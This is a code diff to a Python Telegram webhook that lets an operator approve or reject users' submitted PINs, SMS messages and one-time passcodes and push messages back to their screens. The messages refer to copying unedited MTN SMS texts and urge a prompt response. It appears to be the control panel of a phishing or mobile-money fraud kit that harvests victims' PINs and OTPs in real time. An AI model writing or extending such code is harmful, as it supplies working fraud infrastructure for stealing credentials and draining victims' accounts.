@@ -97,34 +97,46 @@ def telegram_webhook():
                     {"_id": obj_id},
                     {"$set": {"status": new_status, "custom_message": ""}}
                 )
-                print(f"Update result for {new_status}: modified count = {result.modified_count}")
                 text_response = f"✅ {step_code.upper()} Approved!"
 
             elif action == "reject":
+                if step_code == "pin":
+                    new_status = "Reject_PIN"
+                    fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
+                elif step_code == "sms":
+                    new_status = "Reject_SMS"
+                    fail_msg = "❌ SMS message was invalid or expired. Please re-copy and paste."
+                elif step_code == "otp":
+                    new_status = "Reject_OTP"
+                    fail_msg = "❌ Final OTP incorrect. Please check your messages and try again."
+                else:
+                    new_status = "Rejected"
+                    fail_msg = "❌ Request rejected. Please try again."
+
                 applications_collection.update_one(
                     {"_id": obj_id},
-                    {"$set": {"status": "Rejected", "custom_message": "Verification failed. Please restart your application."}}
+                    {"$set": {"status": new_status, "custom_message": fail_msg}}
                 )
-                text_response = f"❌ {step_code.upper()} Rejected!"
+                text_response = f"❌ {step_code.upper()} Rejected & Sent Back!"
 
             elif action == "badsms":
                 applications_collection.update_one(
                     {"_id": obj_id},
-                    {"$set": {"status": "BadInput", "custom_message": "Invalid SMS or data format submitted. Please copy the complete, unedited message from MTN."}}
+                    {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid SMS/data format submitted. Please copy the complete, unedited message from MTN."}}
                 )
                 text_response = "⚠️ Flagged bad input for user correction."
 
             elif action == "stalled":
                 applications_collection.update_one(
                     {"_id": obj_id},
-                    {"$set": {"status": "StalledPrompt", "custom_message": "Your session is waiting for authorization. Please respond promptly to avoid cancellation."}}
+                    {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Your session is waiting for authorization. Please respond promptly."}}
                 )
                 text_response = "⏱️ Sent stall reminder to user."
 
             elif action == "msg":
                 applications_collection.update_one(
                     {"_id": obj_id},
-                    {"$set": {"status": "CustomMessage", "custom_message": "Admin Note: Please review your entry and provide the correct information."}}
+                    {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please review your entry and provide the correct information."}}
                 )
                 text_response = "💬 Prompt sent to user screen!"
 
